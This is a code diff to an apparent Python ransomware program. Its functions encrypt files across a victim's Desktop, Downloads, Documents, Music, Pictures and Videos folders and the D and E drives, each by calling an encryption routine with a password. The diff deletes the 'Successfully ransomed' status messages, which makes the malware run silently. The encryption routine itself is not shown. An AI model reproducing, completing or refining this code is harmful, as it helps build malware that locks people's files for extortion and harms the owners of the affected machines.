@@ -118,7 +118,6 @@ def C_drive_desktop():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            print("Successfully ransomed C Drive Desktop")
             
             C_drive_downloads()
         else:
@@ -193,7 +192,6 @@ def C_drive_downloads():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            print("Successfully ransomed C Drive Downloads")
             
             C_drive_documents()
         else:
@@ -268,7 +266,6 @@ def C_drive_documents():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            print("Successfully ransomed C Drive Documents")
             
             C_drive_music()
         else:
@@ -343,7 +340,6 @@ def C_drive_music():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            print("Successfully ransomed C Drive Music")
             
             C_drive_pictures()
         else:
@@ -418,7 +414,6 @@ def C_drive_pictures():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            print("Successfully ransomed C Drive Pictures")
 
             C_drive_videos()
         else:
@@ -493,8 +488,7 @@ def C_drive_videos():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            print("Successfully ransomed C Drive Videos")
-
+            
             D_drive()
         else:
             shit = 420
@@ -570,7 +564,6 @@ def D_drive():
                 enc_fun(password(passwd),file_input)
 
             finshed = True
-            print("Successfully ransomed D Drive")
             
             E_drive()
         else:
@@ -647,7 +640,6 @@ def E_drive():
             else:
                 enc_fun(password(passwd),file_input)
 
-            print("Successfully ransomed E Drive")
             finshed = True
             
         else:
